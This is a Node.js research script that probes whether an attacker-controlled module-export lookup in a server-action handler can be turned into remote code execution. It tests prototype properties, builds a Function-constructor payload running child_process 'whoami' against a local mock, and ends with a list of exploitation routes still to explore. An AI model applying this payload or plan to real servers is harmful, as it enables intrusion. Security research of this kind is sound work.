/**
 * Research: Can we abuse Function.prototype.bind for RCE?
 *
 * The code does:
 *   var fn = requireModule(serverReference);
 *   return fn.bind.apply(fn, [null].concat(bound));
 *
 * If fn is not a function but an object, what happens?
 */

console.log("=== Bind Attack Research ===\n");

// What the vulnerability gives us:
// moduleExports[name] where we control name
// We can access prototype properties like 'constructor', 'toString', etc.

// Test 1: What is moduleExports['constructor']?
const actionsModule = {
  myAction: async () => "hello"
};

console.log("1. actionsModule['constructor']:", actionsModule['constructor']);
// Returns [Function: Object]

// Can we call bind on it?
const ObjectConstructor = actionsModule['constructor'];
console.log("   ObjectConstructor.bind:", ObjectConstructor.bind);
// Yes, functions have .bind

// Test 2: What happens when we bind Object constructor?
try {
  const boundObject = ObjectConstructor.bind(null, "test");
  console.log("2. Object.bind(null, 'test'):", boundObject);
  const result = boundObject();
  console.log("   Result:", result, typeof result);
} catch(e) {
  console.log("   Error:", e.message);
}

// Test 3: What about toString? It's also a function
const toStringFn = actionsModule['toString'];
console.log("\n3. actionsModule['toString']:", toStringFn);
try {
  const boundToString = toStringFn.bind(null);
  console.log("   Calling bound toString:", boundToString());
} catch(e) {
  console.log("   Error:", e.message);
}

// Test 4: valueOf
const valueOfFn = actionsModule['valueOf'];
console.log("\n4. actionsModule['valueOf']:", valueOfFn);
try {
  const boundValueOf = valueOfFn.bind(null);
  const result = boundValueOf();
  console.log("   Result:", result);
} catch(e) {
  console.log("   Error:", e.message);
}

// Test 5: What if we could somehow get Function from prototype?
console.log("\n5. Checking Function access from prototype chain:");
console.log("   Object.constructor:", Object.constructor);
console.log("   Is Function:", Object.constructor === Function);

// WAIT! Object.constructor IS Function!
// And Function.constructor is also Function!

console.log("\n=== KEY INSIGHT ===");
console.log("Object.constructor === Function:", Object.constructor === Function);

// But can we access it via moduleExports?
const objectFn = actionsModule['constructor']; // This is Object
console.log("\n6. Object function (from constructor):", objectFn);
console.log("   objectFn.constructor:", objectFn.constructor);
console.log("   Is Function:", objectFn.constructor === Function);

// The problem is we need TWO property accesses:
// moduleExports['constructor']['constructor']
// But the vulnerability only gives us ONE!

console.log("\n=== What if there's a module that exports Object? ===");

// Many modules export classes or Object itself
// Example: If a module exports { Object } or similar

const moduleWithObject = {
  Object: Object,  // Some modules might do this
  Function: Function,  // Very rare but possible
};

console.log("7. If module exports Object:");
console.log("   module['Object']:", moduleWithObject['Object']);
console.log("   module['Function']:", moduleWithObject['Function']);

// If we had access to a module that exports Function directly,
// we could do: Function('return process...')

console.log("\n=== Testing Function RCE ===");
if (moduleWithObject['Function']) {
  try {
    const evilFn = moduleWithObject['Function']('return process.mainModule.require("child_process").execSync("whoami").toString()');
    console.log("8. RCE via Function export:", evilFn());
  } catch(e) {
    console.log("8. Error:", e.message);
  }
}

console.log("\n=== Searching for modules that export Function ===");
// Let's check some common npm packages
const possibleModules = [
  'util',
  'events',
  'stream',
];

for (const modName of possibleModules) {
  try {
    const mod = require(modName);
    const exports = Object.keys(mod);

    // Check if any export IS Function
    for (const key of exports) {
      if (mod[key] === Function) {
        console.log(`FOUND! ${modName}.${key} === Function`);
      }
    }

    // Check if any export has .constructor === Function (functions do)
    for (const key of exports) {
      if (typeof mod[key] === 'function') {
        // All functions have .constructor === Function
        // But we need to access it IN ONE property access
      }
    }
  } catch(e) {
    console.log(`Could not load ${modName}:`, e.message);
  }
}

console.log("\n=== CONCLUSION ===");
console.log(`
The vulnerability allows: moduleExports[attackerControlled]

To get RCE, we need either:
1. A module that directly exports: Function, eval, or dangerous Node APIs
2. A module where exports[attackerString] returns a dangerous function

Options to explore:
1. Find a module that exports \`Function\` directly
2. Find a module that exports a function which evals its arguments
3. Find a bundler config that exposes Node built-ins
4. Find a prototype pollution to add dangerous exports
`);

// Final test: What if we could somehow make the manifest lookup return something else?
console.log("\n=== Manifest Lookup Attack ===");
// The code does: bundlerConfig[id] to look up module metadata
// If we send id='__proto__', then bundlerConfig['__proto__'] = Object.prototype
// But Object.prototype doesn't have 'id', 'chunks', 'name' properties!

const fakeManifest = {
  "validAction": { id: "actions-chunk", chunks: [], name: "default" }
};

console.log("manifest['__proto__']:", fakeManifest['__proto__']);
console.log("manifest['constructor']:", fakeManifest['constructor']);
// These don't have the expected properties, so they'd fail validation
